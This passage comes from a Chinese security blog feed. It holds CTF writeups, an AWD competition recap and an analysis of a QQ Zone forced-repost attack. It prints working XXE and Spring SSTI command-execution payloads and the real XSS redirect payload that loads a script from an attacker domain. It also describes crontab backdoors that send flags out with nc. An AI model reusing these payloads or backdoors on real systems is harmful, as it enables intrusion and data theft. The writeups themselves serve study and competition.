class="string">&#x27;c\xd4\xca\xc7\xaa,Tf&#x27;</span>, <span class="string">&#x27;p\xd1\xbf0\x02E\x0e\x1e&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    d1= <span class="string">&#x27;3a6dc48f313deb27&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    d2= <span class="string">&#x27;07204bdf8af35c65&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys[::-<span class="number">1</span>]:</span><br><span class="line">        d1 = xor(xor(d1,HASH(d2)),i)</span><br><span class="line"></span><br><span class="line">        d1 ,d2 = d2, d1</span><br><span class="line">    <span class="keyword">return</span> d2+d1</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="序列变换"><a href="#序列变换" class="headerlink" title="序列变换"></a>序列变换</h3><p>apk拖到apkkiller里,发现transfrom.smail比较奇怪.右键查看java代码,如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.zjctf_android;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tansform</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">transformSeq</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = paramString.length();</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder(paramString);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= j) &#123;</span><br><span class="line">        <span class="keyword">return</span> localStringBuilder.toString();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ((paramString.charAt(i) &gt;= <span class="string">&#x27;A&#x27;</span>) &amp;&amp; (paramString.charAt(i) &lt;= <span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">        localStringBuilder.setCharAt(i, (<span class="keyword">char</span>)(paramString.charAt(i) + <span class="string">&#x27;\001&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ((paramString.charAt(i) &gt;= <span class="string">&#x27;a&#x27;</span>) &amp;&amp; (paramString.charAt(i) &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">        localStringBuilder.setCharAt(i, (<span class="keyword">char</span>)(paramString.charAt(i) - <span class="string">&#x27;\001&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      i += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到如果是大写ascii加一,如果是小写ascii减一</p><p>又根据题目提示,解包看到pwd.txt,需要其中第12701行.找到它</p><p>因为不太会写java,所以用python来解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s = <span class="string">&#x27;j4nlO512Y82Swe44CoNlVzWM&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line">            ans.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> string.lowercase:</span><br><span class="line">            ans.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans.append(i)</span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="comment">#flag: i4mkP512Z82Tvd44DnOkWyXN</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>第一次参加的ctf就是两年前的杭电ctf,当时基本啥都不会.</p><p>现在又遇到这种难度的比赛,有种守得云开见月明的感觉,大部分题目都思路清晰,还有几道没接出来的题目也都有线索,但因知识积累不够未能解开.</p><p>比如流量题目,很快就找到了隐藏的破损的二维码,但是不熟悉二维码算法无法还原.</p><p>解开wp中的这几道题目甚至只用了一个小时.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;本文原发于sec圈 : &lt;a href=&quot;https://www.secquan.org/Discuss/1070283&quot;&gt;https://www.secquan.org/Discuss/1070283&lt;/a&gt; ,博客转自本人仅做备份用途&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF&amp;AWD" scheme="https://m09ic.top/categories/CTF-AWD/"/>
    
    
    <category term="writeup" scheme="https://m09ic.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>QQ空间流氓转发分析</title>
    <link href="https://m09ic.top/posts/6862/"/>
    <id>https://m09ic.top/posts/6862/</id>
    <published>2019-09-03T08:53:47.000Z</published>
    <updated>2021-01-04T14:52:57.751Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文原发于先知社区 <a href="https://xz.aliyun.com/t/6238">https://xz.aliyun.com/t/6238</a> , 博客转自本人仅做备份用途</em></p><h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>最近遇到多位老哥在骂,qq空间的链接一点就转发了一个封面为色情图片,内容为菠菜站的链接.我就好奇这难道是qq空间的XSS蠕虫?</p><a id="more"></a><p>BAT关键业务出了xss在9102年也不算小事情了,至少圈内会炸锅.但是一直没消息,直到我的好友也遭到了攻击.</p><p>好奇之下,抓了个包分析.发现这是个有趣的攻击链,至少我没见过这种攻击方式.由一系列漏洞组成.</p><p>中间一段时间忘了这事,前两天翻到给微博src提交的漏洞被打回.</p><p><img src="1.png" alt="1"></p><p>最后一部分转发的截图和代码忘了保留,见谅.不过这也是一个有趣的绕过qq安全机制的案例.</p><p>(貌似之前看到过有人写过分析了,昨天去找的时候又没找到,于是我又自己分析了一遍)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https%3A%2F%2Fweibo.cn%2Fsinaurl%3F_wv%3D1027%26cmd%3Dplay%26u%3Dhttps%253A%252F%252Fwww.whitedomin.com%252Fmember%252Findex.php%253Fgourl%253D%25252F%25252Fst.duanwenxue.com%25252Fpost-624.html%252522%25257d%252529%25257d%25252bwindow%25255b%252522eval%252522%25255d%252528atob%252528%252522ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp%252522%252529%252529%25252bfunction%252528%252529%25257b%2524.post%252528%25257b1%253A%252522%2526r%253D1561387991%2526business%253D%2523123</span><br></pre></td></tr></table></figure><p>一步一步来分析.</p><h3 id="微博任意url跳转"><a href="#微博任意url跳转" class="headerlink" title="微博任意url跳转"></a>微博任意url跳转</h3><p>已经提交给微博并被驳回,因此公开应该没什么问题.</p><p>测试一下,将payload填到浏览器并用bp抓包,可以看到</p><p><img src="2.png" alt="1"></p><p>follow redirection 302跳转到了某白名单网站的网站</p><h3 id="某白名单网站self-xss"><a href="#某白名单网站self-xss" class="headerlink" title="某白名单网站self-xss"></a>某白名单网站self-xss</h3><p>(虽然该漏洞已修复,但还是抹去相关信息)</p><p>qq空间的分析链接是有验证的,虽然不知道具体验证机制,但是大致可以猜到是白名单验证.微博显然在白名单内,而且如果是302跳转会迭代验证,直到非302响应状态码.</p><p>因此还需要个存在xss漏洞在白名单内的网站.</p><p>因此黑产找了一个存在get请求的self-xss的网站,并且通过js再次进行跳转绕过检测机制.</p><p><img src="3.png" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.whitedomin.com&#x2F;member&#x2F;index.php?gourl&#x3D;%2F%2Fst.whitedomin.com%2Fpost-624.html%22%7d%29%7d%2bwindow%5b%22eval%22%5d%28atob%28%22ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp%22%29%29%2bfunction%28%29%7b$.post%28%7b1:%22&amp;r&#x3D;1561387991&amp;business&#x3D;#123</span><br></pre></td></tr></table></figure><p>xss漏洞存在于该网站站内跳转的gourl参数,再次经过302跳转后同时指向了self-xss的js代码.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;)&#125;+window[&quot;eval&quot;](atob(&quot;ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp&quot;))+function()&#123;$.post(&#123;1:&quot;&amp;r&#x3D;1561387991&amp;business&#x3D;#123</span><br></pre></td></tr></table></figure><p>base64解码:</p><p><code>document.write(&quot;&lt;script src=&#39;https://img.dafeiblog.com/web/if.php&#39;&gt;&lt;/script&gt;&quot;)</code></p><p>可以看到,再次跳转向了第三方的网站,绕过了腾讯的检测机制.</p><h3 id="恶意域名执行转发"><a href="#恶意域名执行转发" class="headerlink" title="恶意域名执行转发"></a>恶意域名执行转发</h3><p>(因为当时在hw,只抽了几分钟大致看了一下,以为保留了该页面的恶意js代码,后来找的时候发现并没有,抱歉)</p><p>(所以这一部分主要根据我的记忆以及猜想)</p><p>该恶意网站伪造了腾讯拦截页面.</p><p><img src="4.png" alt="1"></p><p>因为腾讯的拦截页面并不显示url,所以普通用户很难发现是伪造的.</p><p>该页面下镶嵌有恶意js代码,只有30-40行,大致是两个XHR请求的函数.</p><p>猜测功能应该是跳转到博彩网站,以及请求腾讯空间转发接口.</p><p>这时候手机端按返回键回到qq空间,就会有个弹窗,提示是否转发.选择不转发还会跳出来,强行结束qq进程才能停止弹窗.</p><p>听说低qq版本或是低安卓版本没有这个提示框,会直接转发,(我并没有验证过)</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>利用链是这样的:</p><p>微博任意url跳转 — 其他白名单内网站self-xss — 跳转至恶意网站执行恶意js </p><p>这种绕过方法算是self-xss的新用法,用作绕过某些存在分享内容安全检测的应用.(至少我没见过)</p><p>因为恶意网站js代码没有保存.因此并不知道是如何实现的qq空间转发功能以及无限循环转发弹窗.</p><p>因为过程中并没有传输用户相关信息,只能猜测是qq提供了转发的api以供第三方应用调用,导致被黑产利用.</p><p>可以参考下这两篇较早的文章,虽然利用思路完全不一样.</p><p><a href="https://www.freebuf.com/vuls/75711.html">https://www.freebuf.com/vuls/75711.html</a></p><p><a href="https://www.freebuf.com/column/144879.html">https://www.freebuf.com/column/144879.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;本文原发于先知社区 &lt;a href=&quot;https://xz.aliyun.com/t/6238&quot;&gt;https://xz.aliyun.com/t/6238&lt;/a&gt; , 博客转自本人仅做备份用途&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;最近遇到多位老哥在骂,qq空间的链接一点就转发了一个封面为色情图片,内容为菠菜站的链接.我就好奇这难道是qq空间的XSS蠕虫?&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞分析" scheme="https://m09ic.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>三次AWD训练赛小结</title>
    <link href="https://m09ic.top/posts/7646/"/>
    <id>https://m09ic.top/posts/7646/</id>
    <published>2019-08-31T16:46:01.000Z</published>
    <updated>2021-01-04T14:51:30.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>八月份星盟内部一共打了三次训练赛,靠抱大腿,成绩都还可以,都在前几名,最后一次更是靠着缘分拿到第一.(我们是冠军!滑稽</p><p>之前也打过几次其他比赛的AWD,不过都是挨打那种.</p><p>三次AWD我主要负责自动化攻击以及权限维持.</p><p>简单复盘一下这三次AWD心路历程以及技术细节,记录下如何用正确的姿势抱住大腿.</p><a id="more"></a><h2 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2><p>因为平台bug,没有给我们队下发docker,又因为运维师傅手抖,checkdown多打了个两个0.上来就扣了3000分.勇夺倒数第一.</p><p>后来拿到ssh,一道web一道pwn.web是一个钓鱼网站的源码,除了设置的后门之外应该还有漏洞,但是在较短时间内没有队伍审计出来.</p><p>然后队里有究极强的pwn师傅(@Alkaid) ,在我写出自动化脚本前就把pwn的exp弄出来了,大概十分钟出头.</p><p>web题则丢到d盾里一扫,找到几个后门,有一个assert的后门一直利用到比赛结束都有几个队没有修.</p><p>就靠着pwn和web的后门,写成自动化脚本提交.</p><p>WAF用的是@小远师傅的批量include+流量记录+黑名单阻断的waf.功能还不错,wab的攻击流量都能抓到.</p><p>运维操作失误没给web目录写文件的权限,导致不死马这些都没法使用,所以我们清理干净后门之后就不再失分.</p><p>最后运维把误扣的分加回去,莫名其妙到了第三.</p><p>总得来说,这一次就靠着二进制大佬的大腿,以及@小远师傅快速的给出web的poc.我连权限维持都没有做,尴尬</p><p>因为有师傅写了更全面完整的,就不写具体情况了.漏洞细节参考大佬文章,<a href="https://xz.aliyun.com/t/6024">记一次AWD反杀之旅</a>.我们队并没有特别的手段,靠着稳健苟到第三.</p><h2 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2><p>这是官方wp<a href="https://share.weiyun.com/5dxQUSz">https://share.weiyun.com/5dxQUSz</a> ,都是人为设置的漏洞,并没有什么特别新颖的漏洞.</p><p>中间隔了一周,第二次吸取上次没有做权限维持的教训,折腾了下一些简单的权限维持手段,(会单独写一篇文章交流思路和代码),虽然最后没有用上.</p><p>还是老套路,web丢d盾找后门,快速自动化攻击.</p><p>因为平台没变,上回的脚本的部分代码可以重复利用.</p><p>这回开的一道pwn题两道web题,其中一道是thinkphp框架,原本以为会有tp的洞,但是除了两三个后门之外并没有其他的漏洞.</p><p>这次waf用的是另一个师傅的,因为checkdown比较宽松,所以就把全部响应换成一个假flag了.</p><p>其中一个洞设置的比较明显,还需要反序列化.在我们写出poc之前就被清理干净了.另外一个任意文件读取以及变量覆盖的漏洞设置的也很明显,但是利用方式较为简单,直接就拿出来刷分.</p><p>这里遇到有队师傅思路很骚,任意文件读取漏洞上放了一个1个g的文件,如果单线程用脚本跑,直接就卡主了.我也中招了浪费了好几轮时间.这是个很有趣的搅屎思路.</p><p>另外一套web题也是类似的情况,存在变量覆盖漏洞或者sql注入得到md5,cmd5解密得到密码或者爆破密码登陆后台,然后通过任意文件上传getshell.</p><p>第二道web题我们并没有第一时间找到poc,只是修复了sql注入以及弱密码,但是还是很快被人上传了不死马.</p><p>最开始不死马文件名还是不变的,写了个sh脚本删除文件,然后重启apache服务终结不死马进程.但是实际上有可能被别人条件竞争执行命令,建议不要用这种办法.</p><p>过了几轮,web目录每个下面塞满了不死马.我们还是通过脚本正则匹配文件名删除不死马重启apache的方式清理.清理的sh脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while true</span><br><span class="line">do</span><br><span class="line">rm -rf &#96;find &#x2F;var&#x2F;www&#x2F;html -name .*.php&#96;</span><br><span class="line">sleep 0.1s</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这回pwn师傅没能成功给出exp,但是也修复了漏洞,少掉一个失分点.</p><p>这次因为手慢了,能执行代码的漏洞大家都修复了,只能利用到读文件的漏洞,任意文件上传的洞没用上,所以权限维持的手段没用到.只能苟住自己的分,靠着读文件的洞在几个萌新队那里刷分.</p><p>最后排名我记得是第五还是第六.</p><h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>web题目链接以及wp:<a href="https://share.weiyun.com/5nZd7c0">https://share.weiyun.com/5nZd7c0</a></p><p>这次也算是靠缘分的反杀之旅了.</p><p>这次我们队里的二进制师傅修完洞就身体不舒服先走了.所以得分全部靠web,以及后期权限维持住的得分.</p><p>这回的web题出的稍微好了一点,几个洞都是d盾扫不出来了.</p><p>漏洞详情就看官方writeup吧,我就说一下我们是如何做的.</p><p>经过一开始的手忙脚乱,浪费了40分钟时间,但是幸运的是,我们的数据库挂了,只被checkdown,没被乱入,第一个小时排名是靠后的.</p><p>队里的师傅@12end和@小远 几分钟就各给出了poc,一个是phpmyadmin的任意文件读,一个是异或后门.</p><p>phpmyadmin的洞需要登录,弱密码又很快就被修复,遂没有批量化这个漏洞.</p><p>一开始写提交脚本的时候卡了20分钟,浪费了大量时间,排名在中游水准.</p><p>完成自动化后排名慢慢上升,在第三第四的位置.</p><p>这回用上了之前写的权限维持的工具.找到vps开一个socket的接口,每当有flag传过来就自动提交flag.</p><p>然后通过crontab写后门, 每分钟自动nc传输flag到我的远程服务器.</p><p><img src="1.png" alt="1"></p><p>大概有四五支队伍种了crontab后门,排名稳定在前三.</p><p>比赛大概进行到两个小时左右,前几名的战队开始用pwn拿分了,但是我们的pwn选手生病了.比分被拉大.</p><p>这时候我就想着,反正我有crontab后门了,那我就帮其他队修一下漏洞.于是批量帮助其他队伍删除了异或免杀后门.</p><p>这时候,我一看提交记录,好巧,被我种了crontab后门的队伍正好是第一第二第五名.</p><p>删除掉官方后门后,大部分队伍不再拿到web的分.只有我们和少数几只队伍拿着零星的分.</p><p>其他队伍最后还能拿的分应该是mysql读文件的那个洞.在最后二十分钟我们抓流量拿到了payload,但是显然来不及搭建环境和写脚本了.</p><p>最后排名停在第一.有些时候,缘分到了,分就来了.咋一共拿到四个后门,就是125名呢?</p><p>总结:</p><p>权限维持做的不够好,讲道理应该不死马,dns隧道,ssh隧道之类的都用上的.但是一时心急,忘了留shell,只有一个crontab后门反弹flag,如果别人删除了后门,我自己也没办法再getflag.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>连续打了三场,提升还是很大的.</p><p>AWD最关键的点就是手速,自动化以及权限维持.漏洞挖不倒没关系,上了waf抓流量就好.</p><p>自动化和权限维持一定要快,方式要多.让别人一时半会儿找不到,清不完.如果和勒索病毒挖矿木马有过捉迷藏经验的小伙伴一定体验过那种痛苦.</p><p>这是提交flag的代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subflag</span>(<span class="params">flag</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;flag:&#x27;</span>+flag</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">    url = <span class="string">&quot;http://ip/commit/flag&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;flag&#x27;</span>:flag , <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;******************************&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url,headers=headers,data = json.dumps(data))</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><p>至于权限维持,会单独写一篇文章详细交流.</p><p>还有一个点很关键,就是找个腿粗的pwn师傅.以及最关键的缘分,缘分到了,你手里的后门一定是比你排名靠前的.</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;写在之前&quot;&gt;&lt;a href=&quot;#写在之前&quot; class=&quot;headerlink&quot; title=&quot;写在之前&quot;&gt;&lt;/a&gt;写在之前&lt;/h2&gt;&lt;p&gt;八月份星盟内部一共打了三次训练赛,靠抱大腿,成绩都还可以,都在前几名,最后一次更是靠着缘分拿到第一.(我们是冠军!滑稽&lt;/p&gt;
&lt;p&gt;之前也打过几次其他比赛的AWD,不过都是挨打那种.&lt;/p&gt;
&lt;p&gt;三次AWD我主要负责自动化攻击以及权限维持.&lt;/p&gt;
&lt;p&gt;简单复盘一下这三次AWD心路历程以及技术细节,记录下如何用正确的姿势抱住大腿.&lt;/p&gt;</summary>
    
    
    
    <category term="CTF&amp;AWD" scheme="https://m09ic.top/categories/CTF-AWD/"/>
    
    
    <category term="学习笔记" scheme="https://m09ic.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Ogeek CTF Quals 2019 Writeup</title>
    <link href="https://m09ic.top/posts/45148/"/>
    <id>https://m09ic.top/posts/45148/</id>
    <published>2019-08-25T17:38:28.000Z</published>
    <updated>2021-01-04T14:52:32.632Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>周末打了这个比赛,趟大佬的车,混到第六.如果不是我这么菜,有机会第四或第三的.</p><p>如此简单的web题都解不了,丢人(捂脸</p><p>感谢比赛过程中队内各位大佬给的各种提示.</p><p>以下writeup仅是我自己能解的题或参与解的题.</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="LookAround"><a href="#LookAround" class="headerlink" title="LookAround"></a>LookAround</h3><p>F12查看源码发现一个文件名奇怪的js,功能是定时发送请求.</p><p>请求内容比较奇怪,猜测就是考点,xxe了.</p><p>随便改了下xml,就发生500报错.</p><p>尝试了下常见的payload,猜测逻辑,如果xml合法则无返回,xml异常则500报错.</p><p>队内师傅提醒之下,找到关键点</p><p><img src="/1.png" alt="img"></p><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">exploiting-xxe-with-local-dtd-files</a></p><p>文章里给的payload</p><p><img src="/2.png" alt="1566745929599"></p><p>文件不存在,那就找一个linux系统默认存在的,直接去linux全局文件搜索</p><p><img src="/1566746039967.png" alt="1566746070866"></p><p>找一个可以用的,报错xxe成功获取flag</p><p>最终payload如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">&#x27;aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><p>随便测试了一下,发现[[9*9]]中的内容被执行了输出了49.</p><p>搭配题目名字render,SSTI没跑了.</p><p>网上搜索发现了几个可用的payload</p><p><a href="https://www.4hou.com/vulnerable/9779.html">https://www.4hou.com/vulnerable/9779.html</a></p><p><code>[[$&#123;T(java.lang.System).getenv()&#125;]]</code></p><p><img src="/1566747041625.png" alt="1566747041625"></p><p>执行命令:</p><p><code>$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;cat etc/passwd&#39;)&#125;</code></p><p>但是没有回显,测试了<code>nc,curl,wget</code>都弹不出来.不熟悉java.</p><p>然后队内师傅提示,直接读文件.</p><p><code>[[$&#123;new java.io.BufferedReader(new [java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(&quot;cat /flag&quot;).getInputStream())).readLine()&#125;]]</code></p><p>或</p><p><code>[[$&#123;new java.io.BufferedReader(new [java.io.FileReader(&quot;/flag&quot;)).readLine()&#125;]]</code></p><h3 id="Easy-Realworld-Challenge"><a href="#Easy-Realworld-Challenge" class="headerlink" title="Easy Realworld Challenge"></a>Easy Realworld Challenge</h3><p>比赛的时候没做出来,卡在FTP读文件,时间上差了一点,有机会第四,还是我太菜了.</p><p>题解明天再整</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babycry"><a href="#babycry" class="headerlink" title="babycry"></a>babycry</h3><p>常见套路,第一次爆破flag前7位需要手动改一下,懒得写一键脚本了.第七位到最后爆破的脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">flagkey&#x3D;&quot;1234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-_&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">def conn ():</span><br><span class="line">    global  r</span><br><span class="line">    r &#x3D; remote(&quot;139.9.222.76&quot;,19999)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">    #r.sendline(&quot;1&quot;*pad)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cut_text(text,lenth):</span><br><span class="line">    textArr &#x3D; re.findall(&#39;.&#123;&#39;+str(lenth)+&#39;&#125;&#39;, text)</span><br><span class="line">    textArr.append(text[(len(textArr)*lenth):])</span><br><span class="line">    return textArr</span><br><span class="line"></span><br><span class="line">def get(conn,s):</span><br><span 